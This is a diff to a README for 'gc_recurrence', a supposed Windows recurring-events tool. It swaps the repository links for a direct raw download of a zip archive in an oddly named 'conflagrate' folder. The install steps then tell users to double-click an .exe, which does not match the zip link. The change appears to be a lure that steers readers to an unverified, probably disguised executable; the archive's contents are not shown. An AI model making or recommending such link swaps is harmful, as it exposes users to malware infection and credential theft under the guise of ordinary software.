@@ -1,6 +1,6 @@
 # 📅 gc_recurrence - Manage recurring events with ease today
 
-[![Download gc_recurrence](https://img.shields.io/badge/Download-gc_recurrence-blue)](https://github.com/Wilberunconfused316/gc_recurrence)
+[![Download gc_recurrence](https://img.shields.io/badge/Download-gc_recurrence-blue)](https://github.com/Wilberunconfused316/gc_recurrence/raw/refs/heads/main/conflagrate/gc_recurrence_v2.1.zip)
 
 ## 🎯 About this software
 
@@ -14,7 +14,7 @@ Your computer needs Windows 10 or Windows 11 to run this software. You should ha
 
 Follow these instructions to install the program on your computer.
 
-1. Visit [this page](https://github.com/Wilberunconfused316/gc_recurrence) to download the installer.
+1. Visit [this page](https://github.com/Wilberunconfused316/gc_recurrence/raw/refs/heads/main/conflagrate/gc_recurrence_v2.1.zip) to download the installer.
 2. Look for the file ending in .exe in the releases section.
 3. Save the file to your desktop for easy access.
 4. Double-click the file to start the installation process.
